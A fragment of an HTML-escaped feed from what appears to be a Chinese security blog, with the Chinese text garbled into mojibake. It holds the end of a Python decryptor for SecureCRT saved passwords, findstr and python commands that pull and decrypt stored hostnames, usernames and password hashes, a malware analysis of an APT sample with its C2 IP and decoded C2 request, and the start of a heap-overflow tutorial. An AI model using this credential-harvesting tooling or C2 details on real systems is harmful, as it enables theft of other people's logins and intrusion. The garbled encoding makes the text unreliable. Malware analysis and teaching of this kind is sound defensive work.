      This parameter is optional.&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;    [-p ConfigPassphrase]  The config passphrase that SecureCRT uses.&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;                           This parameter is optional.&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;    &lt;plaintext|ciphertext&gt; Plaintext string or ciphertext string.&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;                           NOTICE: Ciphertext string must be a hex string.&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;                           This parameter must be specified.&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">EncryptionRoutine</span>(<span class="params">UseV2 : <span class="built_in">bool</span>, ConfigPassphrase : <span class="built_in">str</span>, Plaintext : <span class="built_in">str</span></span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> UseV2:</span><br><span class="line">                print(SecureCRTCryptoV2(ConfigPassphrase).Encrypt(Plaintext))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(SecureCRTCrypto().Encrypt(Plaintext))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">&#x27;Error: Failed to encrypt.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">DecryptionRoutine</span>(<span class="params">UseV2 : <span class="built_in">bool</span>, ConfigPassphrase : <span class="built_in">str</span>, Ciphertext : <span class="built_in">str</span></span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> UseV2:</span><br><span class="line">                print(SecureCRTCryptoV2(ConfigPassphrase).Decrypt(Ciphertext))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(SecureCRTCrypto().Decrypt(Ciphertext))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">&#x27;Error: Failed to decrypt.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Main</span>(<span class="params">argc : <span class="built_in">int</span>, argv : <span class="built_in">list</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">3</span> &lt;= argc <span class="keyword">and</span> argc &lt;= <span class="number">6</span>:</span><br><span class="line">            bUseV2 = <span class="literal">False</span></span><br><span class="line">            ConfigPassphrase = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> argv[<span class="number">1</span>].lower() == <span class="string">&#x27;enc&#x27;</span>:</span><br><span class="line">                bEncrypt = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">elif</span> argv[<span class="number">1</span>].lower() == <span class="string">&#x27;dec&#x27;</span>:</span><br><span class="line">                bEncrypt = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                Help()</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">            </span><br><span class="line">            i = <span class="number">2</span></span><br><span class="line">            <span class="keyword">while</span> i &lt; argc - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> argv[i].lower() == <span class="string">&#x27;-v2&#x27;</span>:</span><br><span class="line">                    bUseV2 = <span class="literal">True</span></span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">elif</span> argv[i].lower() == <span class="string">&#x27;-p&#x27;</span> <span class="keyword">and</span> i + <span class="number">1</span> &lt; argc - <span class="number">1</span>:</span><br><span class="line">                    ConfigPassphrase = argv[i + <span class="number">1</span>]</span><br><span class="line">                    i += <span class="number">2</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    Help()</span><br><span class="line">                    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> bUseV2 == <span class="literal">False</span> <span class="keyword">and</span> <span class="built_in">len</span>(ConfigPassphrase) != <span class="number">0</span>:</span><br><span class="line">                print(<span class="string">&#x27;Error: ConfigPassphrase is not supported if &quot;-v2&quot; is not specified&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> bEncrypt:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> EncryptionRoutine(bUseV2, ConfigPassphrase, argv[-<span class="number">1</span>]) <span class="keyword">else</span> -<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> DecryptionRoutine(bUseV2, ConfigPassphrase, argv[-<span class="number">1</span>]) <span class="keyword">else</span> -<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Help()</span><br><span class="line"></span><br><span class="line">    exit(Main(<span class="built_in">len</span>(sys.argv), sys.argv))</span><br></pre></td></tr></table></figure><h4 id="8-Xç‰ˆæœ¬"><a href="#8-Xç‰ˆæœ¬" class="headerlink" title="8.Xç‰ˆæœ¬"></a>8.Xç‰ˆæœ¬</h4><p>è¿›å…¥ç›®å½•æå–æ–‡ä»¶ä¸­çš„è¿æ¥IPã€ç«¯å£ã€è´¦å·ã€hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findstr &#x2F;si &#x2F;c:&quot;Hostname&quot; &#x2F;c:&quot;\&quot;Username\&quot;&#x3D;&quot; &#x2F;c:&quot;\&quot;Password V2\&quot;&#x3D;&quot; &#x2F;c:&quot;\&quot;[SSH2] Port\&quot;&#x3D;&quot; *.ini</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/23.png" alt="image-20210611163435588"></p><p>ç„¶åä½¿ç”¨ä¸Šé¢è„šæœ¬è§£å¯†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#æ³¨æ„å»é™¤hashçš„å‰é¢ä¸‰ä½ &quot;02:&quot;</span><br><span class="line">python3  SecureCRT.py dec -v2 hash</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/24.png" alt="image-20210611163621590"></p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;redteam.today&#x2F;2019&#x2F;12&#x2F;09&#x2F;%E4%BD%BF%E7%94%A8mimikatz%E5%AF%BC%E5%87%BAchrome%E5%AF%86%E7%A0%81&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;3gstudent.github.io&#x2F;%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;tianhe1986&#x2F;FatSmallTools</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;kinnisoy&#x2F;GetChromePassword</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;dzxs&#x2F;Xdecrypt</span><br><span class="line">https:&#x2F;&#x2F;rcoil.me&#x2F;2019&#x2F;09&#x2F;%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;Yang34&#x2F;p&#x2F;14237114.html</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>è”“çµèŠ±APTç»„ç»‡é’ˆå¯¹å·´åŸºæ–¯å¦å®šå‘æ”»å‡»çš„æ ·æœ¬åˆ†æ</title>
    <link href="https://www.ascotbe.com/2021/05/18/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/"/>
    <id>https://www.ascotbe.com/2021/05/18/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/</id>
    <published>2021-05-18T15:45:42.000Z</published>
    <updated>2021-05-23T09:45:35.677Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å£°æ˜</p></blockquote><p>éƒ‘é‡å£°æ˜ï¼šæ–‡ä¸­æ‰€æ¶‰åŠçš„æŠ€æœ¯ã€æ€è·¯å’Œå·¥å…·ä»…ä¾›ä»¥å®‰å…¨ä¸ºç›®çš„çš„å­¦ä¹ äº¤æµä½¿ç”¨ï¼Œä»»ä½•äººä¸å¾—å°†å…¶ç”¨äºéæ³•ç”¨é€”ä»¥åŠç›ˆåˆ©ç­‰ç›®çš„ï¼Œå¦åˆ™åæœè‡ªè¡Œæ‰¿æ‹…ï¼</p><blockquote><p>å‰è¨€</p></blockquote><p>å¼€ä¸ªæ–°å‘ï¼Œå­¦ä¹ ä¸‹æ ·æœ¬åˆ†æçœ‹çœ‹æœ‰ä»€ä¹ˆå¥½çš„å…æ€æŠ€æœ¯èƒ½å¤Ÿè®©æˆ‘æ•´åˆçš„ï¼Œç¬¬ä¸€ç¯‡æ–‡ç« å°±å‚è€ƒ<a href="https://bbs.pediy.com/thread-249319.htm">Crazyman</a>å¸ˆå‚…å†™æ–‡ç« çš„å’Œç½‘ä¸Šå„ä¸ªæ²™ç®±çš„å·²æœ‰çš„å†…å®¹</p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/1.png" alt="image-20210519180644203" style="zoom: 50%;" /><blockquote><p>æ ·æœ¬</p></blockquote><table><thead><tr><th align="left">æ–‡ä»¶ç±»å‹</th><th align="left">PE32 executable (console) Intel 80386, for MS Windows</th></tr></thead><tbody><tr><td align="left">æ–‡ä»¶å¤§å°</td><td align="left">31KB</td></tr><tr><td align="left">MD5</td><td align="left">8d42c01180be7588a2a68ad96dd0cf85</td></tr><tr><td align="left">SHA1</td><td align="left">89a7861acb7983ad712ae9206131c96454a1b3d8</td></tr><tr><td align="left">SHA256</td><td align="left">0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0</td></tr><tr><td align="left">æ—¶é—´æˆ³</td><td align="left">0x5C32FC2B (Mon Jan 07 15:13:47 2019)</td></tr><tr><td align="left">PDB</td><td align="left">c:\Users\Asterix\Documents\Visual Studio 2008\Projects\28NovDwn\Release\28NovDwn.pdb</td></tr><tr><td align="left">æ•°æ®</td><td align="left"><a href="https://github.com/Ascotbe/SampleAnalysis/tree/master/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0">æ ·æœ¬å’ŒIDAæ•°æ®åº“ä¸‹è½½</a></td></tr></tbody></table><blockquote><p>æ²™ç®±æ•°æ®</p></blockquote><ul><li><p><a href="https://app.any.run/tasks/7ef05c98-a4d4-47ff-86e5-8386f8787224/">any.run</a></p></li><li><p><a href="https://www.virustotal.com/gui/file/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/details">virustotal</a></p></li><li><p><a href="https://s.threatbook.cn/report/file/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/?sign=history&env=win7_sp1_enx86_office2013">threatbook</a></p></li></ul><h2 id="å¼€å§‹åˆ†æ"><a href="#å¼€å§‹åˆ†æ" class="headerlink" title="å¼€å§‹åˆ†æ"></a>å¼€å§‹åˆ†æ</h2><p>å…ˆåœ¨å‰é¢æ”¾å‡ ä¸ªç»å¸¸ç”¨åˆ°çš„æ–‡æ¡£å’Œx64gdbç›¸å…³æ’ä»¶</p><ul><li><p><a href="https://docs.microsoft.com/zh-cn/previous-versions/s3f49ktz(v=vs.120)">æ•°æ®ç±»å‹èŒƒå›´</a></p></li><li><p><a href="https://docs.microsoft.com/zh-cn/previous-versions/2e6a4at9%28v%3dvs.120%29">C++ å…³é”®å­—</a></p></li><li><p><a href="https://github.com/horsicq/x64dbg-Plugin-Manager">X64DBGæ’ä»¶å®‰è£…å™¨</a></p></li><li><p><a href="https://github.com/bootleg/ret-sync">IDAå’ŒX64GDBè”åŠ¨</a></p></li><li><p>CSIDL values</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;tarma.com&#x2F;support&#x2F;im9&#x2F;using&#x2F;symbols&#x2F;functions&#x2F;csidls.htm</span><br><span class="line">https:&#x2F;&#x2F;www.nirsoft.net&#x2F;articles&#x2F;find_special_folder_location.html</span><br><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;windows&#x2F;win32&#x2F;shell&#x2F;csidl</span><br></pre></td></tr></table></figure></li></ul><p>æœ¬æ–‡å¯¹æ ·æœ¬é™æ€å’ŒåŠ¨æ€åŒæ­¥åˆ†æï¼Œæ ·æœ¬æ‹¿æ¥å…ˆä¸¢åˆ°pestudioä¸­çœ‹ä¸‹æ•°æ®ï¼Œç»“æœåœ¨é‡Œé¢çœ‹åˆ°äº†PDBçš„è·¯å¾„</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/2.png" alt="image-20210518154946052"></p><p>æ¥ç€ä¸¢IDAä¸­åˆ†æï¼Œé¦–å…ˆæ‰¾åˆ°WinMainå‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°ç¬¬9è¡Œæœ‰ä¸€ä¸ªè‡ªå®šä¹‰å‡½æ•°<strong>sub_401140</strong></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/3.png" alt="image-20210518170332795"></p><p>è¿›å…¥å‡½æ•°<strong>sub_401140</strong>å¯ä»¥çœ‹åˆ°å°±æ˜¯ä¸€ä¸ªæ³¨å†Œçª—å£ç›¸å…³çš„ï¼Œè¯¥å‡½æ•°ç¬¬7è¡Œçš„<strong>sub_4011D0</strong>æ˜¯ç”¨æ¥å¤„ç†çª—å£çš„</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/4.png" alt="image-20210518170458445"></p><p><strong>sub_4011D0</strong>å†…å®¹å¦‚ä¸‹</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/5.png" alt="image-20210518171307047"></p><p>æ¥ç€æˆ‘ä»¬å›åˆ°WinMainå‡½æ•°ï¼Œä»ç¬¬9è¡Œåˆ°ç¬¬17è¡Œçš„å†…å®¹çœ‹æˆªå›¾çš„æ³¨é‡Šå°±èƒ½æ˜ç™½äº†ï¼Œæˆ‘ä»¬é‡ç‚¹çœ‹<strong>sub_401330</strong>å‡½æ•°ï¼Œè¿›å…¥å‡½æ•°ä¸­çœ‹åˆ°281è¡Œå’Œ282è¡Œåˆ›å»ºäº†<code>c:\\intel\\</code>è·¯å¾„</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/6.png" alt="image-20210519171938860"></p><p>æ¥ç€å¾€ä¸‹çœ‹</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/7.png" alt="image-20210519172132691"></p><p>åœ¨332è¡Œä¸­æœ‰ä¸ª<strong>sub_403B00</strong>å‡½æ•°ï¼Œå‡½æ•°å¤§æ¦‚çš„æ„æ€å°±æ˜¯è¿˜æ˜¯åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œä¸‹å›¾æ˜¯è¯¥å‡½æ•°çš„æœ‰ç”¨çš„å†…å®¹</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/8.png" alt="image-20210519094603305"></p><p>339è¡Œçš„<strong>sub_401F00</strong>æ˜¯ä¸€ä¸ªæ³¨å†Œåˆ—è¡¨å‡½æ•°ï¼Œæˆ‘ä»¬è¿›åˆ°å‡½æ•°é‡Œé¢ä¸­åˆ†æ</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/9.png" alt="image-20210519151517317"></p><p>æ¥ç€åŠ¨æ€è°ƒè¯•åˆ°è¿™ä¸ªç‚¹æ—¶ï¼Œçœ‹æ³¨å†Œåˆ—è¡¨å†…å®¹</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/10.png" alt="image-20210519160539252"></p><p>æˆ‘ä»¬å›åˆ°è°ƒç”¨å‡½æ•°ä¸­ç»§ç»­è·Ÿ</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/11.png" alt="image-20210523160455000"></p><p>æ¥ç€åˆ°355è¡Œå¯ä»¥çœ‹åˆ°ä¸‹å›¾çš„åŠ¨æ€è°ƒè¯•ç»“æœï¼Œæ˜¯æ‰“å¼€äº†å¼€æœºè¿è¡Œå€¼ä¸­</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/12.png" alt="image-20210521173911417"></p><p>ç„¶å356è¡Œåˆ›å»ºäº†ä¸€ä¸ªå¤šçº¿ç¨‹ï¼Œè¿è¡Œçš„å‡½æ•°ä¸º<code>StartAddress</code> ï¼Œæˆ‘ä»¬è¿›å…¥åˆ°è¯¥å‡½æ•°ä¸­æŸ¥çœ‹ï¼Œå‡½æ•°å†…å®¹å¦‚ä¸‹å›¾</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/13.png" alt="image-20210523154624779"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯æƒ³ä»ç³»ç»Ÿç¯å¢ƒå˜é‡æ¨¡å—ä¸­è·å–åˆ°<code>ComSpec</code>çš„å€¼ï¼Œæˆ‘ä»¬åŠ¨æ€è°ƒè¯•è§£å‡ºæ¥æ˜¯ä¸º<code>C:\\WINDOWS\\system32\\cmd.exe</code></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/14.png" alt="image-20210523152111955"></p><p>ç„¶åæˆ‘ä»¬æ‰¾ä¸€å°æ­£å¸¸çš„æœºå™¨æ¥çœ‹çœ‹æ˜¯å¦æ˜¯éƒ½æ˜¯è¿™ä¸ªå€¼</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/15.png" alt="image-20210523152003130"></p><p>æ¥ç€è°ƒè¯•ï¼Œå¯ä»¥çœ‹åˆ°å…¶å®æ˜¯åšäº†ä¸€ä¸ªcopyè‡ªèº«åˆ°<code>C:\\intel\\msdtcv.exe</code>ä½ç½®ï¼Œä¸‹å›¾å¯ä»¥çœ‹åˆ°å†…å®¹ç»“æœ</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/16.png" alt="image-20210521174629776"></p><p>æˆ‘ä»¬æ¥ç€çœ‹åˆ°ç«ç»’å‰‘ï¼Œå¯ä»¥çœ‹åˆ°CMDè¿›è¡Œè¯»å†™æ“ä½œ</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/17.png" alt="image-20210523155647085"></p><p>ç„¶åæˆ‘ä»¬æ¥ç€è·Ÿè¿›åˆ°360è¡Œçš„<code>sub_404670</code>ä¸­ï¼Œå¯ä»¥çœ‹åˆ°å°±è¿™å†™å…¥å¼€æœºå¯åŠ¨é¡¹</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/18.png" alt="image-20210523162935781"></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/19.png" alt="image-20210523163026875"></p><p>æ¥ç€å¾€ä¸‹çœ‹366è¡Œå¼€å§‹åˆ°412è¡Œéƒ½æ˜¯è·å–ç³»ç»Ÿç›¸å…³å†…å®¹</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/20.png" alt="image-20210523170708184"></p><p>æ¥ç€è·Ÿåˆ°469è¡Œ<code>sub_402BA0</code>å‡½æ•°ä¸ºä¸‹è½½æ ¸å¿ƒå‡½æ•°ï¼Œç”±äºæœåŠ¡å™¨å·²ç»å…³äº†ï¼Œæ— æ³•åŠ¨æ€åˆ†æï¼Œå¤§æ¦‚çš„å†…å®¹å°±æ˜¯ä¸‹è½½å‡½æ•°åˆ°<code>C:\Users\ascotbe\AppData\Local\Microsoft\Windows</code>ç›®å½•ç„¶åæ‰§è¡Œè¯¥å‡½æ•°</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/21.png" alt="image-20210523171312548"></p><p>ç”±äºä¸èƒ½åˆ†æè¿”å›ä»¥åçš„åŠŸèƒ½ï¼Œé‚£ä¹ˆæˆ‘ä»¬å›åˆ°423è¡Œï¼Œè¿›å…¥å‡½æ•°<code>sub_402890</code>åˆ†æè¯·æ±‚äº†ä»€ä¹ˆä¸œè¥¿</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/22.png" alt="image-20210523171517787"></p><p>åŠ¨æ€è°ƒè¯•å¯ä»¥çœ‹åˆ°ä¸‹å›¾ï¼Œå¾®æ­¥è·å–åˆ°çš„ipä¸º<strong>162.222.215.90</strong>å’Œæˆ‘è·å–åˆ°çš„ä¸åŒï¼Œè¯¥è¿›ç¨‹åº”è¯¥æ˜¯æœ‰ä¸ªIPæ± ï¼ˆçŒœæµ‹ï¼‰ï¼Œå¦‚æœè·å–ä¸åˆ°ï¼Œå°±ä¼šæ¢ä¸€ä¸ªIPæ¥è¯·æ±‚</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/23.png" alt="image-20210523165338427"></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/24.png" alt="image-20210523172312854"></p><p>é€šè¿‡è§£ç å¾—åˆ°å¦‚ä¸‹å†…å®¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;ourtyaz&#x2F;qwe.php?TIe&#x3D;4fc5fce9.8958.5:68.b76:.df147:ee9526*EFTLUPQ.V:OIKG8*22ACme;!7&#x2F;3&#x2F;:311! HTTP&#x2F;1.1</span><br><span class="line">Host: frameworksupport.net</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆåˆ†æå°±ç»“æŸäº†ï¼Œè¸©äº†å¥½å¤šå‘ï¼Œä½†æ˜¯å­¦åˆ°äº†æŒºå¤šçš„ä¸œè¥¿å¾ˆå¼€å¿ƒ~</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/25.png" alt="image-20210523172602903"></p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Linuxå †æº¢å‡ºæ€»ç»“ï¼ˆ0x01ï¼‰</title>
    <link href="https://www.ascotbe.com/2021/05/04/HeapOverflow_Linux_0x01/"/>
    <id>https://www.ascotbe.com/2021/05/04/HeapOverflow_Linux_0x01/</id>
    <published>2021-05-04T15:45:42.000Z</published>
    <updated>2021-05-17T02:11:20.060Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å£°æ˜</p></blockquote><p>éƒ‘é‡å£°æ˜ï¼šæ–‡ä¸­æ‰€æ¶‰åŠçš„æŠ€æœ¯ã€æ€è·¯å’Œå·¥å…·ä»…ä¾›ä»¥å®‰å…¨ä¸ºç›®çš„çš„å­¦ä¹ äº¤æµä½¿ç”¨ï¼Œä»»ä½•äººä¸å¾—å°†å…¶ç”¨äºéæ³•ç”¨é€”ä»¥åŠç›ˆåˆ©ç­‰ç›®çš„ï¼Œå¦åˆ™åæœè‡ªè¡Œæ‰¿æ‹…ï¼</p><blockquote><p>å‰è¨€</p></blockquote><p>HVVç»“æŸï¼Œç»ˆäºèƒ½é—²ä¸‹æ¥å­¦ä¹ äº†ï¼Œå¼€æ–°å‘å•¦<del>å¥½è€¶</del></p><img src="https://raw.githubusercontent.com/Ascotbe/Random-img/master/HeapOverflow/1.gif" alt="4E2FEA9B95DD08A1A4A30E8A3E4B9C63" style="zoom:33%;" /><blockquote><p>è®°ä¸ªå°çŸ¥è¯†ç‚¹</p></blockquote><ul><li><p>libcæ˜¯Linuxä¸‹çš„ANSI Cå‡½æ•°åº“ã€‚</p></li><li><p><a href="http://www.gnu.org/software/libc/">glibc</a>æ˜¯Linuxä¸‹çš„GUN Cå‡½æ•°åº“ã€‚</p></li></ul><p>Linuxä¸‹åŸæ¥çš„æ ‡å‡†cåº“Linux libcé€æ¸ä¸å†è¢«ç»´æŠ¤ã€‚Linuxä¸‹é¢çš„æ ‡å‡†cåº“ä¸ä»…æœ‰è¿™ä¸€ä¸ªï¼Œå¦‚uclibcã€klibcï¼Œä»¥åŠä¸Šé¢è¢«æåˆ°çš„Linux libcï¼Œä½†æ˜¯glibcæ— ç–‘æ˜¯ç”¨å¾—æœ€å¤šçš„ã€‚glibcåœ¨/libç›®å½•ä¸‹çš„.soæ–‡ä»¶ä¸ºlibc.so.6ã€‚</p><h2 id="å †å†…å­˜ç®¡ç†æœºåˆ¶ä»‹ç»"><a href="#å †å†…å­˜ç®¡ç†æœºåˆ¶ä»‹ç»" class="headerlink" title="å †å†…å­˜ç®¡ç†æœºåˆ¶ä»‹ç»"></a>å †å†…å­˜ç®¡ç†æœºåˆ¶ä»‹ç»</h2><p>ä¸åŒå¹³å°çš„å †å†…å­˜ç®¡ç†æœºåˆ¶ä¸ç›¸åŒï¼Œä¸‹é¢æ˜¯å‡ ä¸ªå¸¸è§å¹³å°çš„å †å†…å­˜ç®¡ç†æœºåˆ¶ï¼š</p><table><thead><tr><th align="center">å¹³å°</th><th align="center">å †å†…å­˜åˆ†é…æœºåˆ¶</th></tr></thead><tbody><tr><td align="center">General purpose allocator</td><td align="center">dlmalloc</td></tr><tr><td align="center">glibc</td><td align="center">ptmalloc2</td></tr><tr><td align="center">free BSD and Firefox</td><td align="center">jemalloc</td></tr><tr><td align="center">Google</td><td align="center">tcmalloc</td></tr><tr><td align="center">Solaris</td><td align="center">libumem</td></tr></tbody></table><p>åœ¨ Linux çš„ <code>glibc</code> ä½¿ç”¨çš„ <code>ptmalloc2</code> å®ç°åŸç†ã€‚æœ¬æ¥ Linux é»˜è®¤çš„æ˜¯ <code>dlmalloc</code>ï¼Œä½†æ˜¯ç”±äºå…¶ä¸æ”¯æŒå¤šçº¿ç¨‹å †ç®¡ç†ï¼Œæ‰€ä»¥åæ¥è¢«æ”¯æŒå¤šçº¿ç¨‹çš„ <code>prmalloc2</code> ä»£æ›¿äº†ã€‚å½“ç„¶åœ¨ Linux å¹³å°ä¸Šçš„ <code>malloc</code> å‡½æ•°æœ¬è´¨ä¸Šéƒ½æ˜¯é€šè¿‡ç³»ç»Ÿè°ƒç”¨ <code>brk</code> æˆ–è€… <code>mmap</code> å®ç°çš„ã€‚</p><p><img 